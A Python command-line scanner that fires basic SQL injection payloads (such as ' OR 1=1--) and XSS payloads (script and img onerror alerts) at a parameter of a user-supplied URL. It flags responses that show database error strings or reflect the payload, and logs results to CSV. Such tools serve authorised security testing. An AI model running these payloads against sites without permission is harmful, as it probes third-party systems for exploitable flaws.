#!/usr/bin/env python3
import requests, threading, time, re, csv
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ---------- Config ----------
MAX_THREADS = 5
sql_payloads = ["' OR '1'='1", "' OR 1=1--", '" OR "1"="1']
xss_payloads = ["<script>alert(1)</script>", '"><img src=x onerror=alert(1)>']
sql_errors   = [r"SQL syntax", r"mysql_fetch", r"ORA-\d+", r"syntax error", r"SQLSTATE", r"unclosed quotation mark"]
# ----------------------------

is_paused = False
pause_lock = threading.Lock()

# ANSI Colors
RESET  = "\033[0m"
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
GRAY   = "\033[90m"

def ascii_banner():
    print(r"""
 __  ______ ____       ____   ___  _     _ 
 \ \/ / ___/ ___|     / ___| / _ \| |   (_)
  \  /\___ \___ \ ____\___ \| | | | |   | |
  /  \ ___) |__) |_____|__) | |_| | |___| |
 /_/\_\____/____/     |____/ \__\_\_____|_|
                                          
         ASCII CLI Scanner - SQLi & XSS
    """)

def pause_listener():
    global is_paused
    while True:
        input("\nPress [Enter] to toggle Pause/Resume\n")
        with pause_lock:
            is_paused = not is_paused
            print(f"[*] Scan {'Resumed' if not is_paused else 'Paused'}")

def scan_payload(session, url, param, ptype, payload, results, total):
    global is_paused
    while True:
        with pause_lock:
            if not is_paused:
                break
        time.sleep(0.1)

    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    detected = False
    try:
        r = session.get(url, params={param: payload}, timeout=15)
        if ptype == "SQLi":
            detected = any(re.search(err.lower(), r.text.lower()) for err in sql_errors)
        else:
            detected = payload in r.text

        # رنگ‌بندی
        color = GREEN if not detected else RED if ptype=="SQLi" else YELLOW
        msg = f"{GRAY}[{ts}]{RESET} {ptype:<4} | {payload:<30} | {color}{'VULN' if detected else 'safe'}{RESET}"
    except Exception as e:
        msg = f"{GRAY}[{ts}]{RESET} {ptype:<4} | {payload:<30} | {RED}ERROR: {e}{RESET}"

    print(msg)
    results.append([ts, ptype, payload, detected])

def progress_bar(done, total, length=40):
    filled = int(length * done / total)
    bar = BLUE + "#" * filled + "-" * (length - filled) + RESET
    print(f"\r[{bar}] {done}/{total}", end="", flush=True)

def main():
    ascii_banner()
    url    = input("Target URL (e.g. http://test.com/page): ").strip()
    param  = input("Parameter (e.g. id): ").strip()
    output = input("Output CSV filename: ").strip()
    if not (url and param and output):
        print("Missing required fields.")
        return

    payloads = [("SQLi", p) for p in sql_payloads] + [("XSS", p) for p in xss_payloads]
    total    = len(payloads)
    results  = []

    threading.Thread(target=pause_listener, daemon=True).start()
    print("\n[*] Starting multi-threaded scan...\n")

    session = requests.Session()
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
        futures = [ex.submit(scan_payload, session, url, param, t, p, results, total) for t, p in payloads]
        done = 0
        for f in as_completed(futures):
            done += 1
            progress_bar(done, total)
    print("\n[*] Scan Complete.")

    # Save CSV
    with open(output, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["Timestamp","Type","Payload","Detected"])
        writer.writerows(results)
    print(f"[+] Results saved to {output}")

if __name__ == "__main__":
    main()
